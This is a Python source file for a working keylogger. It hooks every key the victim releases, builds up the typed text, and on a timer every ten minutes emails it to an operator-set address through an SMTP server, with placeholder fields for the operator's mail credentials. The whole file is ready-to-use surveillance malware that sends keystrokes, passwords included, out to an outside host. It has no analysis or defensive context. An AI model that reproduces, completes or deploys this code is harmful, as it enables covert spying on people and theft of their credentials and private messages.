import keyboard
import smtplib
from threading import Semaphore, Timer

TIMING = 600 # YOu will receive report every 10 min.
EMAIL_ADDR = "your@mailaddress.com" #CHANGE THIS
EMAIL_PASS = "YourMailPassword" #CHANGE THIS

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
    
    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="mail.yourdomain.com.", port=587) #CHANGE THIS
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        if self.log:
            self.sendmail(EMAIL_ADDR, EMAIL_PASS, self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=TIMING)
    keylogger.start()
